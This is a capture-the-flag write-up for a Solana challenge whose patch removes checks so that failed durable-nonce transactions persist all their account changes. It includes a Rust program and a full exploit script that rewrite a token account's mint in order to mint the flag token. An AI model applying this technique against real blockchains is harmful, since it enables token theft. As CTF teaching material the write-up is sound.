# Bugchain

This challenge seems very daunting at first, but is actually very solvable with some basic knowledge of how
Solana and its security guarantees work.

## The bug
The patch removes some checks from the `collect_accounts_to_store` function. With some context clues and some 
`printf`-debugging, it is possible to figure out that this function takes the results of the execution of a transaction, 
and then returns a list of all changed accounts and their new contents. It only receives the accounts from transactions
where the changed state should actually be persisted, i.e. non-failed transactions. But there is one exception, as can
be inferred from the removed checks:

[Durable transaction nonces](https://docs.solana.com/implemented-proposals/durable-tx-nonces) are a mechanism that allows
one to sign a transaction in advance. To prevent store-and-replay attacks, transactions have to include a recent blockhash 
(about 2 minutes old at most) when they are signed). This mechanism allows a signer to store a one-time blockhash in a
Nonce account, sign the transaction with that blockhash, and then send that transaction at any point in the future.

To prevent replay attacks however, the nonce has to be advanced every time it is used (even if the transaction fails, as
failing transactions still have fee-costs). This means the data inside of the account changes, even though the transaction
failed. Looking at the removed checks with this in mind, it becomes clear that they were supposed make sure that only the
changes in the nonce account (and the fee payer, as that account still has to pay for the failed transaction) get persisted.
Without those checks, every account changed in that failed transaction gets persisted.

## The primitive
We now have an insanely powerful primitive: by using the Durable Nonce mechanism, we can send transactions that are failing,
but are still persisted to the chain.

This can be used for a bunch of different attacks. But especially powerful is that the security guarantees of Solana are also
enforced with this mechanism (i.e. only the program owning the account can change the account). There are multiple different
ways of using this to mint yourself a flag token. For example one could deploy a program that changes the mint authority on
the flag mint. The transaction fails, but the mint authority still failed and you can now mint yourself a brand new flag.
Alternatively, the way my solve script does it is create a new mint for a definitely-not-a-flag token, mint yourself some 
tokens, and then change the mint on that token account to the actual flag-token mint.

## The solve script
First, we need a very simple program that changes the mint of any token account to the flag-mint:

```rust
use std::str::FromStr;

use solana_program::entrypoint;
use solana_program::program_pack::Pack;
use solana_program::{account_info::AccountInfo, entrypoint::ProgramResult, pubkey::Pubkey};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let acc = &accounts[0];
    let mut token_account =
        spl_token::state::Account::unpack_unchecked(*acc.data.borrow()).unwrap();
    token_account.mint = Pubkey::from_str("F1agMint11111111111111111111111111111111111").unwrap();
    Pack::pack(token_account, &mut acc.data.borrow_mut()).unwrap();
    Ok(())
}
```

The exploit itself is a breeze, using the poc-framework:

```rust
let payer = read_keypair_file("rich-boi.json").unwrap();
let mint = keypair(1);
let fake_account = keypair(2);
let nonce_account = keypair(3);

let client = localhost_client();

let mut env = RemoteEnvironment::new(localhost_client(), clone_keypair(&payer));

let program = env.deploy_program("program/target/deploy/exploit.so");

if env.get_account(nonce_account.pubkey()).is_none() {
    // create nonce account if it doesn't exist
    env.execute_as_transaction(
        &system_instruction::create_nonce_account(
            &payer.pubkey(),
            &nonce_account.pubkey(),
            &payer.pubkey(),
            env.get_rent_excemption(nonce::State::size()),
        ),
        &[&nonce_account],
    );
} else {
    // advance nonce
    env.execute_as_transaction(
        &[system_instruction::advance_nonce_account(
            &nonce_account.pubkey(),
            &payer.pubkey(),
        )],
        &[],
    );
}
let nonce_state =
    nonce_utils::data_from_account(&env.get_account(nonce_account.pubkey()).unwrap()).unwrap();

// wait three minutes so that the original blockhash is invalid
const N: usize = 18;
for i in 0..N {
    println!("waiting {} of {}", i + 1, N);
    std::thread::sleep(Duration::from_secs(10));
}

// mint tokens to fake account
env.create_token_mint(&mint, payer.pubkey(), None, 0);
env.create_token_account(&fake_account, mint.pubkey());
env.mint_tokens(mint.pubkey(), &payer, fake_account.pubkey(), 1337);

// this transaction will fail, but the changes are still written to disk
let instructions = vec![
    system_instruction::advance_nonce_account(&nonce_account.pubkey(), &payer.pubkey()),
    Instruction {
        program_id: program,
        accounts: vec![AccountMeta::new(fake_account.pubkey(), false)],
        data: vec![],
    },
];
client
    .send_and_confirm_transaction_with_spinner_and_config(
        &Transaction::new_signed_with_payer(
            &instructions,
            Some(&payer.pubkey()),
            &[&payer],
            nonce_state.blockhash,
        ),
        CommitmentConfig::confirmed(),
        RpcSendTransactionConfig {
            skip_preflight: true,
            preflight_commitment: None,
            encoding: None,
        },
    )
    .expect_err("tx did not fail");

// get the flag
env.execute_as_transaction(
    &[Instruction {
        program_id: Pubkey::from_str("F1ag111111111111111111111111111111111111111").unwrap(),
        accounts: vec![
            AccountMeta::new(fake_account.pubkey(), false),
            AccountMeta::new(fake_account.pubkey(), true),
        ],
        data: vec![],
    }],
    &[&fake_account],
)
.print();
```